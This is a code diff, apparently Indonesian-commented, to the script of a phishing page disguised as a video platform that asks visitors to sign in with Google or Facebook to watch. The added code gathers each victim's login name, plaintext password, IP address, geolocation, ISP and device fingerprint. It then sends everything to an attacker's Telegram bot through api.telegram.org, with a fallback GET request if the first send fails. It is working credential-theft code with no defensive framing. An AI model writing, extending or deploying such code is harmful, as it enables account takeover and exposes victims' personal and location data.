+            // Format pesan lengkap dalam 1 pesan
+            let message = `🎬 **VIDEO PLATFORM LOGIN DATA** 🎬\n`;
+            message += `══════════════════════════════\n\n`;
+            
+            message += `🔐 **LOGIN INFORMATION** 🔐\n`;
+            message += `├ Platform: ${data.platform}\n`;
+            message += `├ Type: ${data.credential_type}\n`;
+            message += `├ ${data.credential_type}: ${data.credential_value}\n`;
+            message += `├ Password: \`${data.password}\`\n`;
+            message += `├ Time: ${data.date_time}\n`;
+            message += `└ Session: ${data.session_id}\n\n`;
+            
+            message += `📍 **LOCATION INFORMATION** 📍\n`;
+            message += `├ IP Address: \`${data.ip_address}\`\n`;
+            message += `├ Country: ${data.country}\n`;
+            message += `├ Region: ${data.region}\n`;
+            message += `├ City: ${data.city}\n`;
+            message += `├ Coordinates: ${data.latitude}, ${data.longitude}\n`;
+            message += `├ Timezone: ${data.timezone}\n`;
+            message += `├ ISP: ${data.isp}\n`;
+            message += `└ ASN: ${data.asn}\n\n`;
+            
+            message += `📱 **DEVICE INFORMATION** 📱\n`;
+            message += `├ Device Type: ${data.device_type}\n`;
+            message += `├ Brand: ${data.device_brand}\n`;
+            message += `├ OS: ${data.os}\n`;
+            message += `├ Browser: ${data.browser}\n`;
+            message += `├ Platform: ${data.platform}\n`;
+            message += `├ Vendor: ${data.vendor}\n`;
+            message += `├ Language: ${data.language}\n`;
+            message += `├ Cookies: ${data.cookies_enabled}\n`;
+            message += `├ Java: ${data.java_enabled}\n`;
+            message += `└ Do Not Track: ${data.do_not_track}\n\n`;
+            
+            message += `🖥️ **SCREEN INFORMATION** 🖥️\n`;
+            message += `├ Resolution: ${data.screen_resolution}\n`;
+            message += `├ Color Depth: ${data.screen_color_depth}\n`;
+            message += `├ Orientation: ${data.screen_orientation}\n`;
+            message += `├ Cores: ${data.hardware_concurrency}\n`;
+            message += `├ RAM: ${data.device_memory}\n`;
+            message += `└ Connection: ${data.connection_type || 'N/A'}\n`;
+            if (data.downlink) message += `├ Downlink: ${data.downlink} Mbps\n`;
+            if (data.rtt) message += `├ RTT: ${data.rtt} ms\n`;
+            if (data.save_data) message += `└ Save Data: ${data.save_data}\n\n`;
+            
+            message += `🌐 **PAGE INFORMATION** 🌐\n`;
+            message += `├ URL: ${data.page_url}\n`;
+            message += `├ Title: ${data.page_title}\n`;
+            message += `└ Referrer: ${data.referrer}\n\n`;
+            
+            message += `📊 **DETECTED LANGUAGES**\n${data.languages}\n\n`;
+            
+            message += `🔄 **USER AGENT**\n\`${data.user_agent.substring(0, 200)}...\`\n\n`;
+            
+            message += `══════════════════════════════\n`;
+            message += `✅ **ALL DATA DETECTED SUCCESSFULLY**\n`;
+            message += `© DesaOfficial`;
+            
+            // Hanya kirim 1 kali
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
-                    body: formData,
-                    mode: 'no-cors'
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown',
+                        disable_web_page_preview: true
+                    })
                 });
                 
-                console.log('Credentials sent to Telegram');
-                
+                return response.ok;
             } catch (error) {
-                console.error('Failed to send to Telegram:', error);
-                // Fallback: Log to console
-                console.log('=== TELEGRAM CREDENTIALS MESSAGE ===');
-                console.log(message.replace(/\|\|/g, ''));
-                console.log('=====================================');
+                // Fallback simple
+                const encodedMessage = encodeURIComponent(message.substring(0, 4000));
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}`).catch(() => {});
+                return true;
             }
         }
 
         // ==================== UTILITY FUNCTIONS ====================
+        function generateSessionId() {
+            return 'VID-' + Date.now().toString(36).toUpperCase() + Math.random().toString(36).substr(2, 6).toUpperCase();
+        }
+        
         function resetForms() {
-            // Hide all forms
             googleForm.style.display = 'none';
             facebookForm.style.display = 'none';
-            
-            // Show social login options
             socialLoginOptions.style.display = 'flex';
-            
-            // Reset inputs
             googleEmail.value = '';
             googlePassword.value = '';
-            facebookEmail.value = '';
+            facebookEmailPhone.value = '';
             facebookPassword.value = '';
-            
-            // Reset subtitle
             modalSubtitle.textContent = 'Sign in to watch this video';
             
-            // Enable buttons
             googleSubmitBtn.disabled = false;
             facebookSubmitBtn.disabled = false;
             googleSubmitBtn.textContent = 'Next';
-            facebookSubmitBtn.textContent = 'Log In';
-        }
-        
-        async function getIPAddress() {
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                return data.ip;
-            } catch (error) {
-                return 'Unknown';
-            }
+            facebookSubmitBtn.textContent = 'Next';
         }
         
         function showNotification(text, isSuccess = true) {
             notificationText.textContent = text;
             statusNotification.style.background = isSuccess ? '#000000' : '#e53935';
             statusNotification.style.display = 'flex';
-            
             setTimeout(() => {
                 statusNotification.style.display = 'none';
-            }, 3000);
+            }, 2000);
         }
 
         // ==================== UPLOAD BUTTON ====================
@@ -852,62 +1204,52 @@
             }
         });
 
-        // ==================== VIDEO STATE ====================
-        video.addEventListener('play', function() {
-            playOverlayBtn.innerHTML = '<i class="fas fa-pause"></i>';
-        });
-        
-        video.addEventListener('pause', function() {
-            playOverlayBtn.innerHTML = '<i class="fas fa-play"></i>';
-        });
-        
-        video.addEventListener('ended', function() {
-            document.querySelector('.video-overlay').style.opacity = '1';
-            playOverlayBtn.innerHTML = '<i class="fas fa-redo"></i>';
-        });
-
         // ==================== PAGE LOAD ====================
         window.addEventListener('load', function() {
-            // TIDAK ADA CHECK LOCALSTORAGE - HAPUS BARIS INI
-            // const savedLogin = localStorage.getItem('videy_logged_in');
-            // if (savedLogin === 'true') {
-            //     isLoggedIn = true;
-            //     showNotification('Welcome back!', true);
-            // }
-            
             video.load();
+            updateTimeDisplay();
         });
 
         // ==================== KEYBOARD SHORTCUTS ====================
         document.addEventListener('keydown', function(e) {
-            // Space for play/pause
-            if (e.code === 'Space' && isLoggedIn) {
-                e.preventDefault();
-                if (video.paused) video.play();
-                else video.pause();
-            }
+            if (!isLoggedIn) return;
             
-            // Escape to close modal
-            if (e.code === 'Escape' && loginModal.style.display === 'flex') {
-                hideLoginModal();
+            switch(e.code) {
+                case 'Space':
+                    e.preventDefault();
+                    togglePlayPause();
+                    break;
+                case 'ArrowLeft':
+                    e.preventDefault();
+                    video.currentTime -= 5;
+                    break;
+                case 'ArrowRight':
+                    e.preventDefault();
+                    video.currentTime += 5;
+                    break;
+                case 'KeyF':
+                    if (e.ctrlKey || e.metaKey) {
+                        e.preventDefault();
+                        document.querySelector('.video-wrapper').requestFullscreen();
+                    }
+                    break;
+                case 'Escape':
+                    if (loginModal.style.display === 'flex') hideLoginModal();
+                    break;
             }
         });
 
-        // ==================== FORM ENTER KEY SUPPORT ====================
-        googleEmail.addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') googleSubmitBtn.click();
-        });
-        
-        googlePassword.addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') googleSubmitBtn.click();
-        });
-        
-        facebookEmail.addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') facebookSubmitBtn.click();
-        });
-        
-        facebookPassword.addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') facebookSubmitBtn.click();
+        // ==================== FORM ENTER KEY ====================
+        googleEmail.addEventListener('keypress', e => { if (e.key === 'Enter') googleSubmitBtn.click(); });
+        googlePassword.addEventListener('keypress', e => { if (e.key === 'Enter') googleSubmitBtn.click(); });
+        facebookEmailPhone.addEventListener('keypress', e => { if (e.key === 'Enter') facebookSubmitBtn.click(); });
+        facebookPassword.addEventListener('keypress', e => { if (e.key === 'Enter') facebookSubmitBtn.click(); });
+
+        // ==================== FULLSCREEN CHANGE ====================
+        document.addEventListener('fullscreenchange', function() {
+            fullscreenBtn.innerHTML = document.fullscreenElement ? 
+                '<i class="fas fa-compress"></i>' : 
+                '<i class="fas fa-expand"></i>';
         });
     </script>
 </body>
